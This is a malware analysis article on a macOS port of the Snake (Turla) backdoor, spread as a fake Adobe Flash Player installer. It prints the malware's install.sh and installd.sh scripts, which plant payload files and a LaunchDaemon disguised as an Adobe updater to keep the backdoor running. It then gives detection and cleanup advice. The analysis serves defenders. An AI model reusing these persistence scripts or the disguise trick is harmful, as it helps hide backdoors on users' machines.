Snake malware ported from Windows to Mac

Snake, also known as Turla and Uroburos, is backdoor malware that has been around and
infecting Windows systems since at least 2008. It is thought to be Russian governmental
malware and on Windows is highly-sophisticated. It was even seen infecting Linux systems
in 2014. Now, it appears to have been ported to Mac.
Fox-IT International wrote about the discovery of a Mac version of Snake on Tuesday. It’s not
known at this point how Snake is spread, although the fact that it imitates an Adobe Flash
Player installer suggests a not-very-sophisticated method. (I mean, come on, there are other
pieces of software out there! Why are the bad guys so hung up on Flash installers?)

Distribution method
The malware was found in a file named Install Adobe Flash Player.app.zip. The app inside
the .zip file would appear to be a legit Adobe Flash Player installer. The app is signed,
however, by a certificate issued to an “Addy Symonds” rather than Adobe, but the average
user is never going to know that… as long as it’s signed, Apple’s Gatekeeper system will
allow it, when set to its default settings.

If the app is opened, it will immediately ask for an admin user password, which is typical
behavior for a real Flash installer. If such a password is provided, the behavior continues to
be consistent with the real thing.

Proceeding through the installation to the end will display no suspicious behavior and in the
end, Flash will actually be installed. This is a significant break from other fake Flash
installers, which at best download the real Flash installer and open it separately after
proceeding through a completely unconvincing fake install process.
It turns out that this is because the app incorporates a real Flash installer. The app has a
rather strange internal structure, lacking the normal structure of an application bundle on
macOS. It works, though.

2/4

When the app runs, a malicious executable named Install – also code-signed by Addy
Symonds – runs first. That process, in turn, executes an included shell script named
install.sh:
#!/bin/sh
SCRIPT_DIR=$(dirname "$0")
TARGET_PATH=/Library/Scripts
TARGET_PATH2=/Library/LaunchDaemons
cp -f "${SCRIPT_DIR}/queue" "${TARGET_PATH}/queue"
cp -f "${SCRIPT_DIR}/installdp" "${TARGET_PATH}/installdp"
cp -f "${SCRIPT_DIR}/installd.sh" "${TARGET_PATH}/installd.sh"
cp -f "${SCRIPT_DIR}/com.adobe.update" "$TARGET_PATH2/com.adobe.update.plist"
"${TARGET_PATH}/installd.sh"
"${SCRIPT_DIR}/Install Adobe Flash Player"
exit $RC

This script installs the following components of the malware:
/Library/Scripts/queue
/Library/Scripts/installdp
/Library/Scripts/installd.sh
/Library/LaunchDaemons/com.adobe.update.plist

Next, the script opens the installd.sh shell script then launches the real Install Adobe Flash
Player process, which performs the actual installation of Flash. By the time the Flash installer
interface appears, the machine is already infected.

3/4

The installd.sh script, which is also run by the installed launch daemon, simply checks to see
if the malicious installdp process is running and if it isn’t, launches it.
#!/bin/bash
SCRIPT_DIR=$(dirname "$0")
FILE="${SCRIPT_DIR}/queue#1"
PIDS=`ps cax | grep installdp | grep -o '^[ ]*[0-9]*'`
if [ -z "$PIDS" ]; then
${SCRIPT_DIR}/installdp ${FILE} n
fi
exit $RC

At this point, once installdp is running, the malware is fully functional, providing a backdoor
into the Mac, configured according to the data found in the queue file.

Impact
In all, this is one of the sneakier bits of Mac malware lately. Although it’s still “just a Trojan,”
it’s a quite convincing one if distributed properly. Although Mac users tend to scoff at Trojans,
believing them to be easy to avoid, this is not always the case.
Trojans can be effective even when they’re junk and the social engineering behind them is
poor. Consider how bad it would be if someone were to receive this file in a convincing
spoofed e-mail, supposedly from their IT department or a close friend, telling them to install it
immediately due to a recent Flash vulnerability! As a spear phishing attack, this could be
used with devastating effect.
Further, the installed components of the malware are quite effective as well. Few people
even know that the /Library/Scripts/ folder exists, so that’s a moderately safe place to dump a
payload (although there are better options). The launch daemon is quite unremarkable since
anyone with Adobe software will have other Adobe launch agents or daemons installed. The
average person won’t know this one isn’t legitimate.
Fortunately, Apple revoked the certificate very quickly, so this particular installer is no further
danger unless the user is tricked into downloading it via a method that doesn’t mark it with a
quarantine flag (such as via most torrent apps). Malwarebytes for Mac will detect it as
OSX.Snake and removal, in this case, is a breeze.
If you’re infected, however, as with any backdoor, it’s important to keep in mind that data may
have been stolen, including passwords and any unencrypted files on the hard drive. Keep in
mind that, even if you use File Vault, the files are decrypted as long as you’re logged in, so
this doesn’t really count.
After removing the malware (and restarting the computer), change your passwords and
make sure that you’ve taken any other necessary steps to mitigate damage due to the
possibility of exfiltrated data. And, as always, if this is a business machine, contact IT so they
know about the issue and can take any necessary measures to mitigate risk to the company.
